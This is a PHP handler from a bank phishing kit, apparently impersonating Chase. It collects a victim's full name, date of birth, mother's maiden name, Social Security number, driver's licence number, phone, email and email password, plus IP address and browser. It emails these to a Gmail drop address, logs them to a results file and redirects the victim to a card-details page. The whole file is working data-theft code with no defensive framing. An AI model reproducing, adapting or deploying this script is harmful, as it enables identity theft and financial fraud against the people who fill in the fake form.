<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2PERSONALdetails---------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "D.O.B		: ".$_POST['DB']."\n";
$message .= "M.M.N		: ".$_POST['MN']."\n";
$message .= "S.S.N		: ".$_POST['SN']."\n";
$message .= "D.L.N		: ".$_POST['DL']."\n";
$message .= "PHONE		: ".$_POST['PN']."\n";
$message .= "EMAIL		: ".$_POST['EA']."\n";
$message .= "EPASS		: ".$_POST['EP']."\n";
$message .= "-----------------created by medpage-------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------chaseResult--------------------\n";
$send = "all.results13@gmail.com";
$subject = "chaseResult 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "card.html";
</script>